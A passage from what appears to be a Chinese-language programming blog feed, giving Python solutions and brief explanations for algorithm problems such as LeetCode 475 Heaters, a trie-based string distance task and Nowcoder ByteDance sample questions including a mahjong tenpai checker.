class="built_in">len</span>(arr)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">diff</span>(<span class="params">str1, str2</span>):</span><br><span class="line">        l1, l2 = <span class="built_in">len</span>(str1), <span class="built_in">len</span>(str2)</span><br><span class="line">        min_length = <span class="built_in">min</span>(l1, l2)</span><br><span class="line">        same_length = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> char_index <span class="keyword">in</span> <span class="built_in">range</span>(min_length):</span><br><span class="line">            <span class="keyword">if</span> str1[char_index] == str2[char_index]:</span><br><span class="line">                same_length += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> l1 + l2 - <span class="number">2</span> *same_length</span><br><span class="line"></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length-<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>, length):</span><br><span class="line">            result = <span class="built_in">max</span>(result, diff(arr[i], arr[j]))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># trie</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Time Complexity: O(N*M)</span></span><br><span class="line"><span class="string">    Space Complexity: O(N*M)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Where N is the number of strings and M is the average length of each string</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> deque</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TrieNode</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, val</span>):</span><br><span class="line">        self.val = val</span><br><span class="line">        self.left = <span class="literal">None</span></span><br><span class="line">        self.right = <span class="literal">None</span></span><br><span class="line">        self.isEnd = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to build the trie Node</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buildTree</span>(<span class="params">arr: <span class="type">List</span>[<span class="built_in">str</span>], root: TrieNode</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> currString <span class="keyword">in</span> arr:</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Set starting node as root</span></span><br><span class="line">        currNode = root</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(currString)):</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Get the distance of current character from the end of the string</span></span><br><span class="line">            distance = <span class="built_in">len</span>(currString) - i</span><br><span class="line"></span><br><span class="line">            <span class="comment"># If the current character is 0 the add the distance towards the left child</span></span><br><span class="line">            <span class="keyword">if</span>(currString[i] == <span class="string">&#x27;0&#x27;</span>):</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">not</span> currNode.left):</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># If node doesn&#x27;t exist create and add the distance of the node</span></span><br><span class="line">                    currNode.left = TrieNode(distance)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    currNode.left.val = <span class="built_in">max</span>(currNode.left.val, distance)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Move the current node towards left</span></span><br><span class="line">                currNode = currNode.left</span><br><span class="line"></span><br><span class="line">            <span class="comment"># If the current character is 1 the add the distance towards the right child</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">not</span> currNode.right):</span><br><span class="line">                    currNode.right = TrieNode(distance)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    currNode.right.val = <span class="built_in">max</span>(currNode.right.val, distance)</span><br><span class="line">                currNode = currNode.right</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Set the isEnd true for the last node in the string</span></span><br><span class="line">        currNode.isEnd= <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">maximumDistance</span>(<span class="params">arr: <span class="type">List</span>[<span class="built_in">str</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Build the current node dummy root node for the trie</span></span><br><span class="line">    root = TrieNode(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    buildTree(arr, root)</span><br><span class="line"></span><br><span class="line">    maxDistance = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Initialise an empty queue</span></span><br><span class="line">    q = deque()</span><br><span class="line">    q.append(root)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Do a BFS on the trie</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">len</span>(q) &gt; <span class="number">0</span>):</span><br><span class="line"></span><br><span class="line">        currNode = q.popleft()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(currNode.left <span class="keyword">or</span> currNode.right):</span><br><span class="line"></span><br><span class="line">            <span class="comment"># If both left and right is present them the string differ from here</span></span><br><span class="line">            <span class="keyword">if</span>(currNode.left <span class="keyword">and</span> currNode.right):</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Therefore we add the distance</span></span><br><span class="line">                maxDistance = <span class="built_in">max</span>(maxDistance, currNode.left.val + currNode.right.val)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># If current node is the last node of the string then only one of left or right is present</span></span><br><span class="line">            <span class="keyword">if</span>(currNode.isEnd):</span><br><span class="line">                maxDistance = <span class="built_in">max</span>(maxDistance, currNode.left.val <span class="keyword">if</span> currNode.left <span class="keyword">else</span> currNode.right.val)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(currNode.left):</span><br><span class="line">            q.append(currNode.left)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(currNode.right):</span><br><span class="line">            q.append(currNode.right)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Finally return the maxDistance</span></span><br><span class="line">    <span class="keyword">return</span> maxDistance</span><br></pre></td></tr></table></figure><h2 id="heaters">475. Heaters</h2><p>Winter is coming! During the contest, your first job is to design a standard heater with a fixed warm radius to warm all the houses.</p><p>Every house can be warmed, as long as the house is within the heater's warm radius range.</p><p>Given the positions of <code>houses</code> and <code>heaters</code> on a horizontal line, return the minimum radius standard of heaters so that those heaters could cover all houses.</p><p>Notice that all the <code>heaters</code> follow your radius standard, and the warm radius will the same.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: houses = [1,2,3,4], heaters = [1,4]</span><br><span class="line">Output: 1</span><br><span class="line">Explanation: The two heaters were placed at positions 1 and 4. We need to use a radius 1 standard, then all the houses can be warmed.</span><br></pre></td></tr></table></figure><p>排序加二分, nlogn <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findRadius</span>(<span class="params">self, houses: <span class="type">List</span>[<span class="built_in">int</span>], heaters: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        houses = <span class="built_in">sorted</span>(houses)</span><br><span class="line">        heaters = <span class="built_in">sorted</span>(heaters)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> houses:</span><br><span class="line">            nearest_index = bisect.bisect_left(heaters, i)</span><br><span class="line">            <span class="keyword">if</span> <span class="number">1</span>&lt;= nearest_index &lt;= <span class="built_in">len</span>(heaters) - <span class="number">1</span>:</span><br><span class="line">                res = <span class="built_in">max</span>(res, <span class="built_in">min</span>(<span class="built_in">abs</span>(heaters[nearest_index-<span class="number">1</span>]-i),<span class="built_in">abs</span>(heaters[nearest_index]-i)))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> nearest_index == <span class="number">0</span>:</span><br><span class="line">                    res = <span class="built_in">max</span>(res, <span class="built_in">abs</span>(heaters[<span class="number">0</span>]-i))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    res = <span class="built_in">max</span>(res, <span class="built_in">abs</span>(heaters[-<span class="number">1</span>]-i))</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>牛客字节样题记录</title>
      <link href="/2024/03/14/%E7%89%9B%E5%AE%A2%E5%AD%97%E8%8A%82%E6%A0%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/03/14/%E7%89%9B%E5%AE%A2%E5%AD%97%E8%8A%82%E6%A0%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="万万没想到之聪明的编辑">万万没想到之聪明的编辑</h2><p>需求: 1. 三个同样的字母连在一起，一定是拼写错误，去掉一个的就好啦：比如 helllo -&gt; hello 2. 两对一样的字母（AABB型）连在一起，一定是拼写错误，去掉第二对的一个字母就好啦：比如 helloo -&gt; hello 3. 上面的规则优先“从左到右”匹配，即如果是AABBCC，虽然AABB和BBCC都是错误拼写，应该优先考虑修复AABB，结果为AABCC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入例子：</span><br><span class="line">2</span><br><span class="line">helloo</span><br><span class="line">wooooooow</span><br><span class="line">输出例子：</span><br><span class="line">hello</span><br><span class="line">woow</span><br></pre></td></tr></table></figure><p>直接读入,用栈对最新读入做check就行了 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">inputs = sys.stdin.readlines()[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fix</span>(<span class="params">string</span>):</span><br><span class="line">    fixed_string = []</span><br><span class="line">    fixed_string.append(string[<span class="number">0</span>])</span><br><span class="line">    fixed_string.append(string[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string[<span class="number">2</span>:]:</span><br><span class="line">        <span class="keyword">if</span> char == fixed_string[-<span class="number">1</span>] == fixed_string[-<span class="number">2</span>]:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            fixed_string.append(char)</span><br><span class="line">            <span class="keyword">if</span> fixed_string[-<span class="number">1</span>] == fixed_string[-<span class="number">2</span>]:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(fixed_string) &gt; <span class="number">3</span> <span class="keyword">and</span> fixed_string[-<span class="number">3</span>] == fixed_string[-<span class="number">4</span>]:</span><br><span class="line">                    fixed_string.pop()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(fixed_string)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">for</span> sentence <span class="keyword">in</span> inputs:</span><br><span class="line">    <span class="built_in">print</span>(fix(sentence.strip()))</span><br></pre></td></tr></table></figure></p><h2 id="万万没想到之抓捕孔连顺">万万没想到之抓捕孔连顺</h2><ol type="1"><li>我们在字节跳动大街的 N 个建筑中选定 3 个埋伏地点。</li><li>为了相互照应，我们决定相距最远的两名特工间的距离不超过 D</li></ol><p>给定 N（可选作为埋伏点的建筑物数）、 D（相距最远的两名特工间的距离的最大值）以及可选建筑的坐标，计算在这次行动中，大锤的小队有多少种埋伏选择。 注意： 1. 两个特工不能埋伏在同一地点 2. 三个特工是等价的：即同样的位置组合( A , B , C ) 只算一种埋伏方法，不能因“特工之间互换位置”而重复使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入例子：</span><br><span class="line">4 3</span><br><span class="line">1 2 3 4</span><br><span class="line">输出例子：</span><br><span class="line">4</span><br><span class="line">例子说明：</span><br><span class="line">可选方案 (1, 2, 3), (1, 2, 4), (1, 3, 4), (2, 3, 4)   </span><br></pre></td></tr></table></figure><p>本质是个查找,从前往后遍历,固定被选择的建筑i,找出距离建筑i距离不超过D的尽可能远的建筑,做Cn2即可. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">inputs = sys.stdin.readlines()</span><br><span class="line">N, D = <span class="built_in">map</span>(<span class="built_in">int</span>, inputs[<span class="number">0</span>].split(<span class="string">&quot; &quot;</span>))</span><br><span class="line"><span class="keyword">if</span> N &lt;= <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">location = [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> inputs[<span class="number">1</span>].split(<span class="string">&quot; &quot;</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">binsearch</span>(<span class="params">target, l, r, arr</span>):</span><br><span class="line">    mid = l + (r - l) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">        <span class="keyword">if</span> arr[mid] == target:</span><br><span class="line">            <span class="keyword">return</span> mid</span><br><span class="line">        <span class="keyword">elif</span> arr[mid] &lt; target:</span><br><span class="line">            l = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid - <span class="number">1</span></span><br><span class="line">        mid = l + (r - l) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> mid</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Cn2</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">return</span> n * (n - <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">res = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N-<span class="number">2</span>):</span><br><span class="line">    r = binsearch(location[i] + D, i, N-<span class="number">1</span>, location)</span><br><span class="line">    <span class="keyword">if</span> r - i &gt;= <span class="number">2</span>:</span><br><span class="line">        res += Cn2(r-i)</span><br><span class="line"><span class="comment"># 按牛客需求: 一个数字，表示不同埋伏方案的数量。结果可能溢出，请对 99997867 取模</span></span><br><span class="line"><span class="built_in">print</span>(res % <span class="number">99997867</span>)</span><br></pre></td></tr></table></figure></p><h2 id="雀魂启动">雀魂启动！</h2><p>小包最近迷上了一款叫做雀魂的麻将游戏，但是这个游戏规则太复杂，小包玩了几个月了还是输多赢少。 于是生气的小包根据游戏简化了一下规则发明了一种新的麻将，只留下一种花色，并且去除了一些特殊和牌方式（例如七对子等），具体的规则如下：</p><ol type="1"><li>总共有36张牌，每张牌是1~9。每个数字4张牌。</li><li>你手里有其中的14张牌，如果这14张牌满足如下条件，即算作和牌</li></ol><ul><li>14张牌中有2张相同数字的牌，称为雀头。</li><li>除去上述2张牌，剩下12张牌可以组成4个顺子或刻子。顺子的意思是递增的连续3个数字牌（例如234,567等），刻子的意思是相同数字的3个数字牌（例如111,777）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入例子：</span><br><span class="line">1 1 1 1 2 2 3 3 5 6 7 8 9</span><br><span class="line">输出例子：</span><br><span class="line">4 7</span><br><span class="line">例子说明：</span><br><span class="line">用1做雀头，组123,123,567或456,789的四个顺子</span><br></pre></td></tr></table></figure><p>可以按取面子+雀头看剩下什么牌来做听牌check,可以分3面子+1雀头+1搭子或者4面子+单张,但需要做额外判断(搭子是否听牌以及听什么牌). 所以这里选择另一种方式,直接1-9遍历,必定凑出4面子+1雀头才是听牌. 听牌判断就是迭代加回溯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">inputs = <span class="built_in">map</span>(<span class="built_in">int</span>, sys.stdin.readlines()[<span class="number">0</span>].split(<span class="string">&#x27; &#x27;</span>))</span><br><span class="line">hand = Counter(inputs)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_tinpai</span>(<span class="params">hand, quetou=<span class="number">0</span>, tile=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> tile:</span><br><span class="line">        hand[tile] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(hand.values()) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">sorted</span>(hand.keys()):</span><br><span class="line">        <span class="keyword">if</span> hand[key] &gt; <span class="number">0</span>:</span><br><span class="line">            leftmost = key</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># check 刻子</span></span><br><span class="line">    <span class="keyword">if</span> hand[leftmost] &gt;= <span class="number">3</span>:</span><br><span class="line">        hand[leftmost] -= <span class="number">3</span></span><br><span class="line">        tinpai_1 = check_tinpai(hand, quetou=quetou)</span><br><span class="line">        <span class="comment"># 回溯</span></span><br><span class="line">        hand[leftmost] += <span class="number">3</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tinpai_1 = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> hand[leftmost] &gt; <span class="number">0</span> <span class="keyword">and</span> hand[leftmost + <span class="number">1</span>] &gt; <span class="number">0</span> <span class="keyword">and</span> hand[leftmost + <span class="number">2</span>] &gt; <span class="number">0</span>:</span><br><span class="line">        hand[leftmost] -= <span class="number">1</span></span><br><span class="line">        hand[leftmost + <span class="number">1</span>] -= <span class="number">1</span></span><br><span class="line">        hand[leftmost + <span class="number">2</span>] -= <span class="number">1</span></span><br><span class="line">        tinpai_2 = check_tinpai(hand, quetou=quetou)</span><br><span class="line">        hand[leftmost] += <span class="number">1</span></span><br><span class="line">        hand[leftmost + <span class="number">1</span>] += <span class="number">1</span></span><br><span class="line">        hand[leftmost + <span class="number">2</span>] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tinpai_2 = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> quetou == <span class="number">0</span> <span class="keyword">and</span> hand[leftmost] &gt;= <span class="number">2</span>:</span><br><span class="line">        hand[leftmost] -= <span class="number">2</span></span><br><span class="line">        tinpai_3 = check_tinpai(hand, quetou=quetou + <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 回溯</span></span><br><span class="line">        hand[leftmost] += <span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tinpai_3 = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> tile:</span><br><span class="line">        hand[tile] -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> tinpai_1 <span class="keyword">or</span> tinpai_2 <span class="keyword">or</span> tinpai_3:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> hand[i] &lt; <span class="number">4</span>:</span><br><span class="line">        tinpai = check_tinpai(hand, <span class="number">0</span>, i)</span><br><span class="line">        <span class="keyword">if</span> tinpai:</span><br><span class="line">            result.append(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    <span class="built_in">print</span>(i, end=<span class="string">&#x27; &#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="特征提取">特征提取</h2><p>小明是一名算法工程师，同时也是一名铲屎官。某天，他突发奇想，想从猫咪的视频里挖掘一些猫咪的运动信息。为了提取运动信息，他需要从视频的每一帧提取“猫咪特征”。一个猫咪特征是一个两维的vector&lt;x, y&gt;。如果x_1=x_2 and y_1=y_2，那么这俩是同一个特征。因此，如果喵咪特征连续一致，可以认为喵咪在运动。也就是说，如果特征&lt;a, b&gt;在持续帧里出现，那么它将构成特征运动。比如，特征&lt;a, b&gt;在第2/3/4/7/8帧出现，那么该特征将形成两个特征运动2-3-4 和7-8。现在，给定每一帧的特征，特征的数量可能不一样。小明期望能找到最长的特征运动。</p><p><strong>输入描述</strong> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">第一行包含一个正整数N，代表测试用例的个数。</span><br><span class="line"></span><br><span class="line">每个测试用例的第一行包含一个正整数M，代表视频的帧数。</span><br><span class="line"></span><br><span class="line">接下来的M行，每行代表一帧。其中，第一个数字是该帧的特征个数，接下来的数字是在特征的取值；比如样例输入第三行里，2代表该帧有两个猫咪特征，&lt;1，1&gt;和&lt;2，2&gt;</span><br><span class="line">所有用例的输入特征总数和&lt;100000</span><br><span class="line"></span><br><span class="line">N满足1≤N≤100000，M满足1≤M≤10000，一帧的特征个数满足 ≤ 10000。</span><br><span class="line">特征取值均为非负整数。</span><br></pre></td></tr></table></figure></p><p><strong>示例</strong> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">输入例子：</span><br><span class="line">1</span><br><span class="line">8</span><br><span class="line">2 1 1 2 2</span><br><span class="line">2 1 1 1 4</span><br><span class="line">2 1 1 2 2</span><br><span class="line">2 2 2 1 4</span><br><span class="line">0</span><br><span class="line">0</span><br><span class="line">1 1 1</span><br><span class="line">1 1 1</span><br><span class="line">输出例子：</span><br><span class="line">3</span><br><span class="line">例子说明：</span><br><span class="line">特征&lt;1,1&gt;在连续的帧中连续出现3次，相比其他特征连续出现的次数大，所以输出3</span><br></pre></td></tr></table></figure></p><p>用defaultdict,检测连续特征计数+1,否则pop特征并做max判断 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 